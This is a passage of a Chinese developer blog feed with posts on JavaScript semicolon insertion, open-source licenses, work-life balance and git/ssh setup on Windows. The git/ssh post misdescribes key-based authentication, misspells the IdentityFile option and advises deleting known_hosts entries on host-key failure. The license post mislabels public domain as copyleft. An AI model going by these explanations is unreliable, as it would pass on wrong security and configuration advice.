        <content type="html"><![CDATA[<p>接触前端快三年了，记得是在大二的时候开始进博客园写博，三年的成长有两年得益于与各位前辈的交流和讨论。首先感谢博客园给我们提供了很好的交流平台，也祝博客园的建设越来越好！同时也感谢技术上擦过火花的小伙伴们，希望以后的日子里可以更多更深入的交流！</p><h3>一点学习经验</h3><p>以 <strong>Barret</strong> 这个名字混迹于不少 QQ 群中，时间比较久了，跟一些人也建立了比较好的友谊关系。在群里，不管是提问还是回答别人提出的问题，总能在未知领域找到属于自己的东西。现在还会经常在群里碰到学习前端的新人，他们有时提问抓不到关键词或者不知道如何形容自己的问题，这也让我看到了当初的自己，希望有经验的学习者可以包容这些人，耐心的回答他们提出的问题，因为我们也是这么成长起来的~</p><p>这几年时间我看过很多<a title="豆瓣读书，部分书籍列表" href="http://book.douban.com/people/hustskyking/collect" target="_blank">书籍</a>，每本书都是作者学习经验的浓缩，我很推荐大家买几本参考书籍，如《JavaScript权威指南》、《JavaScript设计模式》、《JavaScript异步编程》、《JavaScript高级程序设计》、《JavaScript语言精粹》、《CSS权威指南》等，这些书籍我都读过三五遍，有些则看过七八遍，所以对一些 JS 比较基础的东西都有所了解。我们在网上所有资料的时候，也推荐大家上权威一点的网站上去查询，如 <a href="//developer.mozilla.org/en/" target="_blank">MDN</a>、<a href="http://msdn.microsoft.com/en-us/#fbid=OYqXopniVLY" target="_blank"> MSDN&nbsp;</a>&nbsp;、<a href="http://www.whatwg.org/" target="_blank">whatwg</a>、<a href="http://www.w3.org/TR/" target="_blank">w3</a>等，在这里我们可以找到最全面最深入的资料。</p><p>对于问题的剖析一定要刨根问底，一直追溯到最底层的原理，比如 垃圾回收机制 追溯到 V8，websocket 追溯到 TCP 层等，把最底层的原理搞明白了，回答别人的问题才会有底气，不然人家几个为什么就会把你问的无话可说了。</p><p>去年的六月份在百度实习了三个月，那时候的同事给我取了个外号，叫\<strong>小胡子哥</strong>"，我也比较喜欢这个 nickname，所以在博客顶上也加上了这个外号。现在我在淘宝UED实习，阿里有个传统就是给自己取花名，当时也没多想，天王被人注册了，所以给自己取了个名字，叫 \<strong>阎王</strong>"。所以大家也可以叫我阎王。</p><h3>文章罗列</h3><p>本来打算在入园两周年发点有技术含量的文章，结果，呵..呵，太忙了，就简单的罗列下自己写过的一点点东西。</p><h4>1. web语音通信</h4><ul><li><a href="http://www.cnblogs.com/hustskyking/p/webAudio-filter.html">让音乐响起来</a></li><li><a href="http://www.cnblogs.com/hustskyking/p/webAudio-show-audio.html">看得到的音频流</a></li><li><a href="http://www.cnblogs.com/hustskyking/p/webAudio-volume.html">音量的控制</a></li><li><a href="http://www.cnblogs.com/hustskyking/p/webAudio-cross-fading.html">声道的转换</a></li><li><a href="http://www.cnblogs.com/hustskyking/p/webAudio-filter.html">声音的过滤</a></li></ul><p>这一系列的文章还没有写完，后续还有几篇，等有时间了整理下。包括如何使用 JavaScript 录音，还是音频的压缩和船速等等。</p><h4>2. 一些原理性的东西</h4><ul><li><a href="http://www.cnblogs.com/hustskyking/p/javascript-asynchronous-programming.html">Javascript异步编程原理</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_17" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/how-to-achieve-loading-module.html">浅谈模块化加载的实现原理</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_19" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/websocket-with-node.html">细说WebSocket - Node篇</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_19" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/websocket-with-node.html"></a><a id="homepage1_PostList1_rptEntries_TitleUrl_18" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/websocket-with-php.html">细说websocket - php篇</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_14" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/how-regular-expressions-work.html">进阶正则表达式</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_4" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/javascript-array.html">你所不知道的JavaScript数组</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_0" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/web-communication.html">JavaScript之web通信</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_2" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/principle-of-javascript-template.html">JavaScript模板引擎原理</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_11" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/javascript-closure.html">对闭包机制的深入理解</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_11" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/javascript-closure.html"></a><a id="homepage1_PostList1_rptEntries_TitleUrl_11" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/problem-javascript-event.html">[解惑]JavaScript事件机制</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_11" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/problem-javascript-event.html"></a><a id="homepage1_PostList1_rptEntries_TitleUrl_17" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/extend-in-jQuery.html">解读jQuery中extend函数</a></li></ul><p>因为喜欢去偏底层的思考，所以对一些经常遇到的东西做了稍微深层的分析。</p><h4>3. 介绍性的东西</h4><ul><li><a id="homepage1_PostList1_rptEntries_TitleUrl_1" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/open-source.html">软件（代码）开源，协议声明</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_5" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/javascript-fullscreen.html">让你的页面瞬间全屏</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_12" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/multiple-download-with-javascript.html">JavaScript多文件下载</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_13" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/manufacture-font-face-in-web.html">再探@font-face及webIcon制作</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_1" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/history-api-in-html5.html">PJAX的实现与应用</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_4" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/ES6-introduce.html">ECMAScript 6 简介</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_7" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/let-your-page-understood-by-search-engine.html">SEO：让搜索引擎对你的网站更有亲和力(译)</a></li></ul><h4>4. 偏应用的</h4><ul><li><a id="homepage1_PostList1_rptEntries_TitleUrl_3" class="PostTitle" href="http://www.cnblogs.com/hustskyking/archive/2013/06/03/3D-Tank-War.html">【屌丝之作】3D遥控坦克大战</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_7" class="PostTitle" href="http://www.cnblogs.com/hustskyking/archive/2013/05/04/getkeywords.html">Javascript综合应用小案例</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_18" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/change-fontSize-with-pure-css.html">字体大小自适应纯css解决方案</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_14" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/responsive-web-desigin.html">那些年，我们一起玩过的响应式布局</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_13" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/javascript-spec.html">前端编码规范之JavaScript</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_15" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/css-spec.html">前端编码规范之CSS</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_9" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/javascript-regexp.html">玩转正则之highlight高亮</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_0" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/semicolon-retalk.html">Javascript分号，加还是不加？</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_3" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/problems-in-git-when-ssh.html">git/ssh捋不清的几个问题</a></li><li><a id="homepage1_PostList1_rptEntries_TitleUrl_15" class="PostTitle" href="http://www.cnblogs.com/hustskyking/p/user-exprience-in-login-box.html">从登录框看前端</a></li></ul><h3>结语</h3><p>在学校，很多时间都是自己支配的，相当自由，工作之后一些事情就身不由己了，我希望自己记录的一点东西可以对新人有帮助，也希望可以通过这些文字记录自己学习的历程。谢谢大家的支持！&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript分号，加还是不加？</title>
      <link href="/blog/2014/03/16/cb-semicolon-retalk/"/>
      <url>/blog/2014/03/16/cb-semicolon-retalk/</url>
      
        <content type="html"><![CDATA[<p>关于这个问题，网上已经有很多人讨论过了，我先说说自己对这个问题的回答：加！（但非必须）</p><p>有些人写代码，懒得加分号，除非是迫不得已才勉强放一个分号上去。如果你可以保证你写的代码不出现任何 bug，那当然是没有问题，但是很多 JSer 新人，对一些隐含的问题并不是特别清楚，很容易在不知不觉中写出一堆 bug，我们先来了解下 JS 词法语法解析的时候，哪些情况下会自动插入分号。</p><h3>一、自动插入分号的规则</h3><p><span><strong>注：鼠标滑过文字可以看到翻译原文</strong></span></p><p>1. <span class="translator" title="When, as the program is parsed from left to right, a token (called the offending token) is encountered that is not allowed by any production of the grammar, then a semicolon is automatically inserted before the offending token if one or more of the following conditions is true:">程序从左到右解析，当纳入下一个 token 无法匹配任何语法：</span></p><ul><li><span class="translator" title="The offending token is separated from the previous token by at least one LineTerminator.">如该 token 跟之前的 token 之间有至少一个 LineTerminal 行终结符违反分割</span></li><li><span class="translator" title="The offending token is }.">该 token 为 `}` 符号时</span></li></ul><p>2. <span class="translator" title="When, as the program is parsed from left to right, the end of the input stream of tokens is encountered and the parser is unable to parse the input token stream as a single complete ECMAScript Program, then a semicolon is automatically inserted at the end of the input stream.">程序从左到右解析，当纳入下一个（或几个） token 不能产生一条合法的语句的时候，会在这个地方插入一个分号。</span></p><p>3. <span class="translator" title="When, as the program is parsed from left to right, a token is encountered that is allowed by some production of the grammar, but the production is a restricted production and the token would be the first token for a terminal or nonterminal immediately following the annotation \[no LineTerminator here]" within the restricted production (and therefore such a token is called a restricted token), and the restricted token is separated from the previous token by at least one LineTerminator, then a semicolon is automatically inserted before the restricted token.">程序从左到右解析，当纳入的 token 能够产生一条合法语句，但是这条语句是受限产生式时，在该受限 token 前面自动插入分号。</span></p><p>上面提到的一些内容来自 ECMAScript5.1 第七章第九节，可以戳<a href="http://barretlee.com/ST/ES5.1/#sec-7.9.1" target="_blank">这里</a>，翻译的不太通顺，实在是太难翻译了= =</p><h3>二、一些不加分号会出问题的场景</h3><p><strong>场景一：</strong></p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">s = <span class="selector-tag">a</span> + <span class="selector-tag">b</span></span><br><span class="line">(x + y)<span class="selector-class">.doSomething</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们期望这是这是两条语句，结果会被解析成：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">s</span> = a + b(x + y).doSomething()<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>b 在这里成了一个函数了。</p><p><strong>场景二：</strong></p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="section">x</span></span><br><span class="line"><span class="section">++</span></span><br><span class="line">y</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个 ++ 符号会给谁？答案是：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">x</span><span class="comment">; ++y;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样的代码当然是很少遇到，但是遇到这种情况：</p><p><strong>场景三：</strong></p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们期望返回 true，结果：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="literal">true</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>给我们返回了 undefined。</p><p><strong>场景四：</strong></p><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">s = <span class="function"><span class="keyword">function</span><span class="params">(x)</span><span class="comment">&#123;return x&#125;</span></span></span><br><span class="line"><span class="function"><span class="params">(1 + 2)</span>.<span class="title">toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><p>他被解析成了</p><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">s = <span class="function"><span class="keyword">function</span><span class="params">(x)</span><span class="comment">&#123;return x&#125;</span><span class="params">(1 + 2)</span>.<span class="title">toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><p><code>function(x)&#123;return x&#125;(1 + 2)</code> 这个作为一个整体，1+2 作为参数送入函数，该函数的返回值为 3，然后执行 3.toString()，这样的问题藏的比较深，不容易被发现。</p><h3>三、规避问题</h3><p>有些语句是以 <code>[</code> 或者 <code>(</code> 开头，就像上面提到的场景一和场景四，这些 token 很容易和上一条没有加分号的语句合并到一起，如果你不太喜欢加分号，可以这样来处理：</p><figure class="highlight wren"><table><tr><td class="code"><pre><span class="line"><span class="variable">s</span> <span class="operator">=</span> <span class="title function_">function</span>(<span class="params">x</span>)&#123;<span class="keyword">return</span> <span class="variable">x</span>&#125;</span><br><span class="line">;(<span class="number">1</span> <span class="operator">+</span> <span class="number">2</span>).<span class="property">toString</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这也是为什么我们会经常看到别人的代码中写出这样的函数：</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">;(<span class="keyword">function</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 function 的前面加了一个分号，目的就是为了防止整个函数的返回值作为参数送入上一条语句之中。</p><p>对于场景三，要特别说明一下，除了 return 之外，还有 break 和 continue 语句，break 和 continue 类似 C 语言中的 goto ，他是可以在后面添加 tag 的，如果 tag 和 这些关键词之间存在 <a href="http://barretlee.com/ST/ES5.1/#sec-7.3" target="_blank">LineTerminal </a>，这些 tag 就会被忽略，如：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">break</span><br><span class="line"><span class="keyword">tag</span></span><br><span class="line"><span class="title"></span></span><br></pre></td></tr></table></figure><p>我们期望程序会调到 tag 所指向的程序段，但结果被解析成</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">break<span class="comment">;</span></span><br><span class="line">tag<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>四、小结</h3><p>看到上面的一些列问题，相信大家心里还是有自己的答案了，如果你有信心代码里头不出现因为不写分号而导致的错误，那分号的取舍其实是无所谓的。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件（代码）开源，协议声明</title>
      <link href="/blog/2014/03/14/cb-open-source/"/>
      <url>/blog/2014/03/14/cb-open-source/</url>
      
        <content type="html"><![CDATA[<p><strong>注意：对于协议有个大概的了解就行了，本文叙述不是很标准，如果要做具体了解，请戳文中给出的链接。</strong></p><p>关于开源协议网上有很多说明，不过写的都十分晦涩，让人木有读下去的欲望，下面给大家简单的科普一下。</p><p>一般很少人关注代码开源的协议说明，我们平时看到的 MIT Apache BSD 等，一堆英文的缩写，也懒得去看具体的内容，这说明你的维权意识还不是很强。辛辛苦苦写了一堆代码，贴到某个分享区，啪一下被人家复制走了，然后别人改个名字，捎带加个协议，说是自己写的，一般情况下这种事情的发生我们可以忽视之，当如果这串代码被人家作为商用，成为挣钱利器，那个时候你后悔也来不及了。</p><p>目前市面上看到的协议种类还是挺繁多的，同一种协议可能还有几个版本，每个版本之间存在细微的差异，如何给自己的代码添加合适的协议？太宽松了，自己劳动成果容易被人家窃取；太苛刻了，人家也不想用你的东西。</p><h4>1. 如果你想使用一个简单不那么麻烦的协议，可以选择 <strong><a href="http://choosealicense.com/licenses/mit/" target="_blank">MIT</a></strong></h4><p>别人需要注意什么呢？署上你的大名，就可以带走你的代码了。你不用为他项目中因使用你的代码出现的问题承担任何责任。</p><h4>2. 如果你顾及到专利，可以选择 <strong><a href="http://choosealicense.com/licenses/apache/" target="_blank">Apache</a></strong></h4><p>可能代码中的某个技术或者创新点，你申请了专利，使用这个协议可以保护你专利的一些权力，简单点说就是让别人免费使用你这专利中的东西。</p><h4>3. 如果你很在意别人对你代码的修改，希望分享并得到促进，可以选择 <strong><a href="http://choosealicense.com/licenses/gpl-v2/" target="_blank">GPL</a></strong></h4><p>GPL 分为两个版本一个是 <a href="http://choosealicense.com/licenses/gpl-v2/" target="_blank">V2</a>，一个是 <a href="http://choosealicense.com/licenses/gpl-v3/" target="_blank">V3</a>，作品带上这个协议之后，别人想分享的话也得加上这个协议，对代码作出比较大的更改也是需要附带说明的。</p><p>上面提到的几个是比较常见的，也提一下其他几个。</p><ul><li><a href="http://choosealicense.com/licenses/lgpl-v2.1/" target="_blank">LGPL</a> 在GPL前面多了个 L，内容和 GPL 差不多，适合一些代码库或者框架使用。</li><li><a href="http://choosealicense.com/licenses/bsd/" target="_blank">BSD</a> 也有两个版本，类似 MIT</li><li><a href="http://choosealicense.com/licenses/no-license/" target="_blank">No License</a> 注意，这可不是没有版权声明，只是作者保留版权（包括分发，复制或者创造衍生物），只是你分享的时候允许分享平台附带的一些操作。如代码扔到 gitlab 上，就表示你允许别人查看并且 fork 你的代码。</li><li><a href="http://choosealicense.com/licenses/unlicense/" target="_blank">Public domain dedication</a> 这玩意儿才是不保留版权，也就是版权自由（Copy Left），跟保留版权（Copy Right）是相对的。基本就是放弃对这段代码的任何权利，可以自由使用。他和不声明版权的区别就是，告诉别人，兄弟，我这代码是没版权的，你随便使用~</li></ul><p><strong>如果还想具体了解其他相关的知识，请直接去<a href="http://choosealicense.com/" target="_blank">http://choosealicense.com/</a>，这里有最权威最全面的的说明。</strong></p><p><strong>汉化版地址：<a href="http://choosealicense.gitcafe.com/" target="_blank">http://choosealicense.gitcafe.com/</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工作，但别忘了生活</title>
      <link href="/blog/2014/03/12/cb-work-in-life/"/>
      <url>/blog/2014/03/12/cb-work-in-life/</url>
      
        <content type="html"><![CDATA[<p>已经一点多了[昨晚写的]，其实我现在挺累的，想去睡个觉，不过有些东西还是需要记录一下。</p><p>人已经不在学校了，也不想谈太多学校里面的事情，社会和学校之间似乎有一层屏障，把很多东西都分隔开了。我挺喜欢学校，很自由，可以不慌不忙的支配时间。只是有些许内疚，大学没去好好支配时间。</p><p>最近在看什么呢？《宏观经济学》、《心理学导论》、《税法》，当然也少不了一些技术书籍。这几天发生在我身边的事情让我感觉到，人特别渺小，尤其是缺乏知识的人，跟社会接轨的比较少，当走进社会之后就显得更渺小了。在学校，每个人都期望着找准自己的位置，寻找社会上适合自己的角色，一些人找到了，还有一些人，继续留在学校，他们或许找到了自己的定位，或许...只是等待更好的时机。</p><p>我是一个工作起来会忘我的人，今天一个 git/ssh 的配置折腾到十点多，八点多的时候站起来看了下周边，已经没什么人了。我不喜欢加班，只是学习的时候忘记了时间。每次思考都会沉浸在自己的世界中，有时候还会哼起小曲儿。不知道这是不是程序员特有的风格。我不喜欢承认自己是程序员，我有很多爱好，也有能力将这些爱好变成我的专长，就像编程一样。</p><p>现在很多上班族都是在外租房，不是自己的家所以也没有太多的归属感。在一个不是自己家的地方生活，会过的比较散漫，上班的唠叨容易带回住处，上班的情绪也会滞留在住处，慢慢地，工作占据了生活。</p><p>做饭做菜就甭说了，一没时间，二没技术，三没心情。周末可能也就是窝在几米见方的小室内，过的很压抑，甚至有压力。</p><p>我觉得现在在外面拼搏的人需要考虑下生活，怎么去生活！很多人做事总是匆匆忙忙的，但是结果呢，像样的东西啥也没做出来，成天说忙，结果不知道时间去哪儿了。整天在挣钱，结果也不知道钱去哪儿了。</p><p>让节奏慢下来，不是让你一分钟敲十行代码改成敲一行。规划好下一步要做的事情，让自己有一个思考和停顿的时间。</p><p>其实生活很简单，它就是吃完饭收拾下碗筷，就是停下脚步看看身边的人在做什么，就是学学做菜，就是出去走走...工作很重要，不过他只是我们生活的一部分，不要让工作占据你生活的一切！</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git/ssh捋不清的几个问题</title>
      <link href="/blog/2014/03/11/cb-problems-in-git-when-ssh/"/>
      <url>/blog/2014/03/11/cb-problems-in-git-when-ssh/</url>
      
        <content type="html"><![CDATA[<p>主要是 windows 用户会遇到很多纠结的问题，linux/unix 用户属于这方面的高端用户，应该有能力处理此类问题，而且网络上也有很多解决方案，本文的授众是 windows 用户。由于今天配置了一下午，虽说配置过程基本搞清楚，懒得重新配置一遍，所以文中皆以文字形式叙述，没有截图。</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/problems-in-git-when-ssh.html">http://www.cnblogs.com/hustskyking/p/problems-in-git-when-ssh.html</a>，转载请注明源地址。</p><h3>一、概念的解释</h3><h4>1. rsa 与 rsa.pub</h4><p>网上很容易搜到的东西我就不说了，我们知道，通过：</p><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">ssh-keygen -<span class="built_in">t</span> rsa -C <span class="string">&quot;something&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以生成两个文件，这两个文件的命名默认是 id_rsa 和 id_rsa.pub，如果你在键入上述命令回车之后，重新输入了命名，那此时生成的两个文件就是 <code>[命名]</code> 和 <code>[命名].pub</code>，这个好理解。</p><p>主要是解释下生成了两个什么东西。id_rsa 可以称之为私有密钥，id_rsa.pub 可以称之为公有密钥。我们会把公有密钥交给服务端，当需要从服务端请求内容的时候，要带上私有密钥。此时，服务器会通过一定的算法计算私有密钥，并判断计算的结果是否与公有密钥一样，如果不一样则响应请求失败。</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">+-----------+                           +-----------+</span><br><span class="line">|<span class="string">           </span>|<span class="string">                           </span>|<span class="string">           </span>|</span><br><span class="line">|<span class="string">           </span>|<span class="string">    enc(rsa) == rsa.pub    </span>|<span class="string">           </span>|</span><br><span class="line">|<span class="string">  client   </span>|<span class="string"> ------------------------&gt; </span>|<span class="string">   server  </span>|</span><br><span class="line">|<span class="string">           </span>|<span class="string">             ?             </span>|<span class="string">           </span>|</span><br><span class="line">|<span class="string">           </span>|<span class="string">                           </span>|<span class="string">           </span>|</span><br><span class="line">+-----------+                           +-----------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rsa.pub 里面是个什么东西，其实很简单：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-rsa <span class="built_in">base64</span>(加密内容) <span class="string">&quot;something&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而 rsa 中是：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">---<span class="attr">--BEGIN</span> RSA PRIVATE KEY-----</span><br><span class="line"><span class="function"><span class="title">base64</span><span class="params">(私有密钥的一些处理)</span></span></span><br><span class="line">---<span class="attr">--END</span> RSA PRIVATE KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>2. 验证程序</h4><p>在使用 git 命令与服务端进行交互之前，我们可以先验证下服务器和客户端是否握手成功了。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> -T git<span class="variable">@xxx</span>.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果是 github，就可以直接写 git@github.com, 如果是 aaa.bbb.com，就可以写 git@aaa.bbb.com。 如果成功，你会看到 success 之类的字眼。</p><h4>3. known_hosts 文件</h4><p>这是个什么文件呢？一般情况下 windows 下不会产生这个文件，先说说他是干什么的。当我们成功与服务端进行连接时，ssh 会记录服务端的 Host、IP 以及 rsa 文件，当连接过程中出现：</p><pre><code>Permanently added '10.0.0.0' (RSA) to the list of known hosts.</code></pre><p>如果你选择 Yes，那这个 known_hosts 文件中就会多出一条记录。windows 是不会自动产生这个文件的，也可能是程序产生了，但是没权限写入，所以我们没有在 .ssh/ 目录下看到这个文件。但如果我们创建了这个文件，会发现里面的内容会随着我们的验证慢慢增加。</p><p>搞清楚了这些概念，我们再说说会遇到的问题。</p><h3>二、常见问题</h3><h4>1. git@xxx.com 输入密钥</h4><p>当你键入 <code>ssh -T git@xxx.com</code> 这条命令之后，程序提示要你输入 git@xxx.com 的密码，那不用想了，程序没找到你的私有密钥。在哪些情况下会这样呢？</p><p>我们在生成这两个密钥的时候，程序可能没有帮我们在根目录下(C:/Users/yourName)新建一个 .ssh/ 文件夹，而他在建立连接的时候会默认寻找 <code>~/.ssh/id_rsa</code>，如果没有新建一个这样的文件夹很显然是找不到的。你可以在根目录下通过命令行来新建一个文件夹</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之所以要用命令行是因为有时候浏览器不让你在文件夹名第一位放点号。</p><p>当然也有可能是因为你没有把创建的两个密钥放到 .ssh/ 目录下，而是直接扔在根目录下。</p><h4>2. Host key verification failed</h4><p>"Host key verification failed." 相信你也撞到了这个问题，主机的密钥验证失败，主机就是你的机器，密钥验证失败有两个原因，一个是 RSA 做了更改，另一个原因是在 known_hosts 中存在一个缓存的记录，如果确认了 RSA 没有错误，那你就应该去 known_hosts 中删掉对应的那个记录（这个记录可以当做是缓存，是对验证做了一次缓存，缓存的作用是减少验证次数，不需要每次都验证，读取缓存就行了）。</p><p>当然，你也可以直接删除这个 known_hosts 文件。</p><h4>3. Permission denied (publickey)</h4><p>"Permission denied (publickey)." 这个问题其实和上面的 2 差不多，当你出现过 "Host key verification failed."，然后继续执行程序，如执行 <code>ssh -T git@xxx.com</code> 的时候就会出现这个问题提醒。说到底就是没有找到你的 rsa 私有密钥，或者 rsa 密钥匹配出错。</p><h3>三、windows 下让人纠结的问题</h3><h4>1. 找不到根目录</h4><p>生成密钥默认放在 "~/.ssh/" 下，但是在 cmd 下操作会找不到 "~/" 这个根目录，因为这是 windows 不是 linux/unix，有些童鞋可能装了 cygwin，在这个环境下操作可以 "cd ~"，git bash 下当然也是可以的。</p><p>如果不知道有这个问题的存在，你会碰到上述问题一，程序直接让你输入密码，但不过你输入什么密码都是错误的。输入三次之后状态为 <code>Permission denied</code>，这里的原因就是没找到 <code>~/.ssh/id_rsa</code> ，cmd 下她根本就不认识 "~/" 这个目录。</p><h4>2. 多个服务端的维护</h4><p>很常见的问题。上面我们说到了，程序会默认寻找 <code>~/.ssh/id_rsa</code> 这个文件，同一目录下显然不能有两个重名文件，也就是说当我们去认证 github 和另外一个 git 服务器的时候，我们需要把两个 rsa 私有密钥的名字换来换去，想用谁就把谁改成 id_rsa。特别麻烦，那肿么办？</p><p>之前在网上看到说是对 ssh_config 进行配置，配置内容是：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    <span class="keyword">User</span> <span class="title">boy-a</span></span><br><span class="line">    IdentifyFile ~/.ssh/github</span><br><span class="line">Host xxx.com</span><br><span class="line">    <span class="keyword">User</span> <span class="title">boy-b</span></span><br><span class="line">    IdentifyFile ~/.ssh/xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的 "~/.ssh/github" 和 "~/.ssh/xxx" 都是 rsa 文件，文件的命令可以直接改，也可以在开始生成的时候设定，命名对内容没有任何影响。项目的几行代码应该也是十分清晰的，针对不同的 git 服务器，使用不用的 IdentifyFile。</p><p>但是你会发现，你的设置毫无用处，因为你把文件名搞错了！在 linux/unix 下可能是使用 ssh_config 这个文件名，但是在 windows 下是使用 config 作为文件名放在 ~/.ssh/ 目录中！</p><h3>四、小结</h3><p>这东西我纠结了一个下午，花了将近三个多小时才解决问题，真心快吐血了！说到底就是一个 config 的配置问题，遇到这种问题最快捷的方式并不是在网上疯狂的搜索答案，而是静下心来看看 rsa | git | ssh 的基础知识，了解每个参数及其用途，对症下药！</p><p><strong>补充：</strong></p><p>　　1）\ssh-add -l" 报错 \Could not open a connection to your authentication agent."</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <strong>操作：ssh-agent bash -login -i</strong></p><p><strong>　　</strong>2）\Are you sure you want to continue connecting (yes/no)?" 选择 yes ，否则会报错\fatal: Could not read from remote repository."</p><p>　　3） config 文件貌似没啥用，IdentifyFile path/to/rsa 这个地方报错。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
